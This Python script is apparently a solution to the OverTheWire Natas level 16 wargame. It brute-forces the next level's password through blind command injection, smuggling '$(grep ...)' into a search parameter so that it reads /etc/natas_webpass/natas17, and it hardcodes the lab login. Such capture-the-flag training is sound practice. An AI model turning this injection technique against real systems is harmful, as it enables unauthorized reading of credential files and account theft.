import string
import requests

URL = 'http://natas16.natas.labs.overthewire.org/?needle=$(grep ^%s /etc/natas_webpass/natas17)african&submit=Search'
CREDS = ('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
ALPHANUM = string.letters + string.digits
AFRICAN = "African"

s = requests.Session()
s.auth = CREDS

password = ""

while len(password) != 32:
	for i in (string.letters + string.digits):
		print "Trying: %s" % i
		test_pass = password + i
		data = s.get(URL % test_pass).text
		if AFRICAN not in data:
			password = test_pass
			print "\tPassword: %s" % password
